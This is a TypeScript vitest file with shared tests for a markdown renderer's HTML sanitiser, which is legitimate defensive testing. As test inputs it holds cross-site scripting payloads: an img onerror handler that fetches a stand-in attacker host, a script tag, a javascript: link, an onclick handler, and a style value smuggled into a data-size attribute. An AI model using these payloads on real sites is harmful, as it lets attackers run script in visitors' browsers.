/*
 *     SPDX-License-Identifier: AGPL-3.0-only
 *
 *     Copyright (C) RainbowDashLabs and Contributor
 */
import {describe, expect, it} from 'vitest'
import {renderMarkdown} from '@/util/markdown'

/**
 * The stories every markdown rendering has to pass, wherever it runs.
 *
 * <p>The browser and the server clean with the same sanitiser over different DOMs, so both test
 * files register the same cases and a difference between the two sides fails one of them.
 *
 * @param side the name the cases are grouped under, saying where they run
 */
export function describeMarkdownRendering(side: string): void {
    describe(`renderMarkdown ${side}`, () => {
        it('renders ordinary markdown', () => {
            const html = renderMarkdown('# Title\n\nA **bold** word.')

            expect(html).toContain('<h1>Title</h1>')
            expect(html).toContain('<strong>bold</strong>')
        })

        it('drops the event handler an author wrote into the markdown', () => {
            const html = renderMarkdown('<img src=x onerror="fetch(\'https://attacker.example\')">')

            expect(html).toContain('<img')
            expect(html).not.toContain('onerror')
        })

        it('drops a script tag', () => {
            const html = renderMarkdown('before<script>alert(1)</script>after')

            expect(html).not.toContain('<script')
            expect(html).not.toContain('alert(1)')
        })

        it('drops a javascript link', () => {
            const html = renderMarkdown('[click](javascript:alert(1))')

            expect(html).not.toContain('javascript:')
        })

        it('keeps a link that goes somewhere', () => {
            const html = renderMarkdown('[docs](https://example.org/docs)')

            expect(html).toContain('href="https://example.org/docs"')
        })

        it('shows sized words in their size in pixels', () => {
            const html = renderMarkdown('Ein <span data-size="24">**großes**</span> Wort')

            expect(html).toContain('<span data-size="24" style="font-size: 24px"><strong>großes</strong></span>')
        })

        it('drops the event handler on a sized span and keeps the size', () => {
            const html = renderMarkdown('<span data-size="14" onclick="alert(1)">Wort</span>')

            expect(html).toContain('<span data-size="14" style="font-size: 14px">Wort</span>')
            expect(html).not.toContain('onclick')
        })

        it('gives no size to anything the editor would not store', () => {
            const html = renderMarkdown('<span data-size="14px; position: fixed">a</span>'
                + '<span data-size="200">b</span><div data-size="14">c</div>')

            expect(html).not.toContain('style=')
        })

        it('answers with nothing for nothing', () => {
            expect(renderMarkdown('')).toBe('')
            expect(renderMarkdown(null)).toBe('')
            expect(renderMarkdown(undefined)).toBe('')
        })
    })
}
